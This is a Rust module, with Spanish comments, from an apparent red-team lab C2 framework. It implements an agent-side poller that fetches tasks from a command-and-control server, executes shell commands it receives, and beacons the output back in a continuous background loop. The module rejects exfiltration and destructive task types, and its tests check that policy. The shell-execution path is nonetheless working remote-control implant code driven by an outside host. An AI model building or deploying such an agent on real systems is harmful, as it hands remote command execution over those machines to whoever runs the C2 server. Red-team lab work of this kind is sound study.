//! TaskPoller — cierra el ciclo operador → agente → resultado del C2.
//! Hive Colony (red-team lab edition).
//!
//! Ronda 4: los agentes recibían tareas solo a través de la arena compartida;
//! la cola HTTP del C2 (`GET /task/:agent_id`) no tenía consumidor. Este
//! módulo sondea la cola, ejecuta la tarea bajo la política de emulación y
//! publica el resultado vía `POST /beacon` con el frame
//! `{"session": <task_id>, "output": <resultado>}` que el shell interactivo
//! retransmite al operador.
//!
//! Configuración por entorno:
//! - `HIVE_C2_URL` (p. ej. `http://127.0.0.1:8444`) — sin ella, el poller no
//!   arranca (los agentes siguen funcionando solo con la arena).
//! - `HIVE_C2_API_KEY` — si el C2 exige `x-api-key`.
//! - `HIVE_POLL_SECS` — intervalo de sondeo (por defecto 10 s).
//!
//! Política de ejecución (ronda 6, tras eliminación de los módulos de
//! simulación ofensiva):
//! - `shell`/`shell_exec`: se ejecuta con auditoría completa (función operadora
//!   del C2).
//! - `exfil` y cualquier comando destructivo: RECHAZADO (`rejected`) — la
//!   capacidad no existe en el enjambre.
//! - Resto: `unsupported`.
use serde::{Deserialize, Serialize};
use tracing::{info, warn};
use uuid::Uuid;

// ── DTOs del protocolo C2 ────────────────────────────────────────────────────

/// Tarea tal y como la entrega `GET /task/:agent_id`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Task {
    pub id: String,
    pub command: String,
    #[serde(default)]
    pub payload: serde_json::Value,
}

#[derive(Debug, Deserialize)]
struct TaskEnvelope {
    #[serde(default)]
    tasks: Vec<C2Task>,
}

/// Resultado de la ejecución local de una tarea.
#[derive(Debug, Clone, Serialize)]
pub struct TaskOutcome {
    pub task_id: String,
    pub command: String,
    /// `ok` | `error` | `simulated` | `unsupported`
    pub status: String,
    pub output: String,
    /// Sesión de shell a la que retransmitir el resultado (tareas `shell_exec`).
    /// Si es `None`, el beacon usa el task_id como session.
    pub shell_session: Option<String>,
}

// ── poller ───────────────────────────────────────────────────────────────────

pub struct TaskPoller {
    c2_base: String,
    agent_id: String,
    agent_role: String,
    api_key: Option<String>,
    client: reqwest::blocking::Client,
}

impl TaskPoller {
    pub fn new(c2_base: &str, agent_id: Uuid, agent_role: &str, api_key: Option<String>) -> Self {
        Self {
            c2_base: c2_base.trim_end_matches('/').to_string(),
            agent_id: agent_id.to_string(),
            agent_role: agent_role.to_string(),
            api_key,
            client: reqwest::blocking::Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .build()
                .unwrap_or_default(),
        }
    }

    /// Construye el poller desde variables de entorno. `None` si no hay C2.
    pub fn from_env(agent_id: Uuid, agent_role: &str) -> Option<Self> {
        let c2 = std::env::var("HIVE_C2_URL").ok()?;
        if c2.is_empty() {
            return None;
        }
        Some(Self::new(
            &c2,
            agent_id,
            agent_role,
            std::env::var("HIVE_C2_API_KEY").ok().filter(|k| !k.is_empty()),
        ))
    }

    fn with_headers(
        &self,
        req: reqwest::blocking::RequestBuilder,
    ) -> reqwest::blocking::RequestBuilder {
        let req = req
            .header("x-agent-id", &self.agent_id)
            .header("x-agent-role", &self.agent_role);
        match &self.api_key {
            Some(k) => req.header("x-api-key", k),
            None => req,
        }
    }

    /// Recoje las tareas pendientes para este agente.
    pub fn fetch_tasks(&self) -> Vec<C2Task> {
        let url = format!("{}/task/{}", self.c2_base, self.agent_id);
        match self.with_headers(self.client.get(&url)).send() {
            Ok(resp) if resp.status().is_success() => match resp.json::<TaskEnvelope>() {
                Ok(env) => env.tasks,
                Err(e) => {
                    warn!("TASK_POLLER: respuesta del C2 no parseable: {e}");
                    Vec::new()
                }
            },
            Ok(resp) => {
                warn!(
                    "TASK_POLLER: C2 respondió {} en GET /task",
                    resp.status()
                );
                Vec::new()
            }
            Err(e) => {
                warn!("TASK_POLLER: C2 no alcanzable ({e}) — reintento en el próximo ciclo");
                Vec::new()
            }
        }
    }

    /// Publica el resultado de una tarea vía beacon.
    pub fn submit_result(&self, outcome: &TaskOutcome) -> bool {
        let url = format!("{}/beacon", self.c2_base);
        let session = outcome
            .shell_session
            .clone()
            .unwrap_or_else(|| outcome.task_id.clone());
        let body = serde_json::json!({
            "agent_id": self.agent_id,
            "agent_role": self.agent_role,
            "session": session,
            "output": outcome.output,
            "kind": "task_result",
            "status": outcome.status,
        });
        match self.with_headers(self.client.post(&url)).json(&body).send() {
            Ok(resp) => {
                if resp.status().is_success() {
                    info!(
                        "TASK_POLLER: resultado de tarea {} entregado ({})",
                        outcome.task_id, outcome.status
                    );
                    true
                } else {
                    warn!(
                        "TASK_POLLER: C2 rechazó el resultado ({}), tarea {}",
                        resp.status(),
                        outcome.task_id
                    );
                    false
                }
            }
            Err(e) => {
                warn!("TASK_POLLER: fallo al entregar resultado: {e}");
                false
            }
        }
    }

    /// Ejecuta una tarea localmente bajo la política de la ronda 6.
    pub fn execute(&self, task: &C2Task) -> TaskOutcome {
        let base = |status: &str, output: String, shell_session: Option<String>| TaskOutcome {
            task_id: task.id.clone(),
            command: task.command.clone(),
            status: status.to_string(),
            output,
            shell_session,
        };

        match task.command.as_str() {
            "shell" | "exec" | "run" | "shell_exec" => {
                let cmd = task
                    .payload
                    .as_str()
                    .map(|s| s.to_string())
                    .or_else(|| {
                        task.payload
                            .get("cmd")
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string())
                    })
                    .or_else(|| {
                        task.payload
                            .get("command")
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string())
                    })
                    .unwrap_or_default();
                if cmd.is_empty() {
                    return base("error", "payload sin comando".into(), None);
                }
                // Auditoría: toda tarea de shell queda registrada con su origen.
                info!(
                    "TASK_POLLER: shell audit — tarea {} solicita '{cmd}' (operator tasking, lab)",
                    task.id
                );
                let r = crate::remote_shell::execute_command(&cmd);
                let output = if r.stderr.is_empty() {
                    r.stdout
                } else {
                    format!("{}\n[stderr] {}", r.stdout, r.stderr)
                };
                base(
                    if r.exit_code == 0 { "ok" } else { "error" },
                    output,
                    // El shell interactivo enruta por su session_id.
                    task.payload
                        .get("session")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string()),
                )
            }
            "exfil" | "encrypt" | "wipe" | "destroy" | "sabotage" => base(
                "rejected",
                format!(
                    "rejected: task type '{}' not supported by this colony (destructive/exfil capability removed, ronda 6)",
                    task.command
                ),
                None,
            ),
            other => base(
                "unsupported",
                format!("unsupported command '{other}'"),
                None,
            ),
        }
    }

    /// Un ciclo completo: fetch → execute → submit. Devuelve los resultados.
    pub fn poll_once(&self) -> Vec<TaskOutcome> {
        let tasks = self.fetch_tasks();
        if tasks.is_empty() {
            return Vec::new();
        }
        info!(
            "TASK_POLLER [{}]: {} tarea(s) recibida(s) del C2",
            self.agent_role,
            tasks.len()
        );
        let mut results = Vec::with_capacity(tasks.len());
        for task in tasks {
            let outcome = self.execute(&task);
            self.submit_result(&outcome);
            results.push(outcome);
        }
        results
    }

    /// Bucle de sondeo en hilo bloqueante dedicado (compatible con tokio).
    pub fn spawn_background(self, interval: std::time::Duration) -> std::thread::JoinHandle<()> {
        std::thread::spawn(move || {
            info!(
                "TASK_POLLER: bucle iniciado ({}, cada {:?})",
                self.agent_id, interval
            );
            loop {
                let _ = self.poll_once();
                std::thread::sleep(interval);
            }
        })
    }
}

/// Punto de enganche único para los agentes: lee el entorno y arranca el
/// bucle de sondeo si hay C2 configurado. Devuelve `true` si arrancó.
pub fn spawn_from_env(agent_id: Uuid, agent_role: &str) -> bool {
    if let Some(poller) = TaskPoller::from_env(agent_id, agent_role) {
        let secs: u64 = std::env::var("HIVE_POLL_SECS")
            .ok()
            .and_then(|s| s.parse().ok())
            .unwrap_or(10);
        let _ = poller.spawn_background(std::time::Duration::from_secs(secs.max(2)));
        true
    } else {
        false
    }
}

// ── tests de política (sin red) ──────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn poller() -> TaskPoller {
        TaskPoller::new(
            "http://127.0.0.1:1", // no se contacta en estos tests
            Uuid::new_v4(),
            "test",
            None,
        )
    }

    #[test]
    fn destructive_and_exfil_commands_are_rejected() {
        let p = poller();
        for cmd in ["encrypt", "wipe", "destroy", "sabotage", "exfil"] {
            let task = C2Task {
                id: "t1".into(),
                command: cmd.into(),
                payload: serde_json::json!({ "path": "/tmp/x" }),
            };
            let out = p.execute(&task);
            assert_eq!(out.status, "rejected", "{cmd} debe rechazarse");
            assert!(out.output.contains("rejected"), "{cmd} debe etiquetarse");
        }
    }

    #[test]
    fn unknown_commands_are_unsupported() {
        let p = poller();
        let task = C2Task {
            id: "t3".into(),
            command: "eternalblue".into(),
            payload: serde_json::json!({}),
        };
        let out = p.execute(&task);
        assert_eq!(out.status, "unsupported");
    }

    #[test]
    fn shell_exec_payload_cmd_is_recognized() {
        // Formato del shell del C2: command="shell_exec", payload={"cmd", "session"}
        let p = poller();
        let task = C2Task {
            id: "t5".into(),
            command: "shell_exec".into(),
            payload: serde_json::json!({ "cmd": "echo hi", "session": "sess-1" }),
        };
        let out = p.execute(&task);
        assert!(matches!(out.status.as_str(), "ok" | "error"));
        assert_eq!(out.shell_session.as_deref(), Some("sess-1"));
        assert!(out.output.contains("hi"));
    }

    #[test]
    fn shell_without_command_is_error() {
        let p = poller();
        let task = C2Task {
            id: "t4".into(),
            command: "shell".into(),
            payload: serde_json::json!({}),
        };
        let out = p.execute(&task);
        assert_eq!(out.status, "error");
        assert!(out.output.contains("comando"));
    }
}
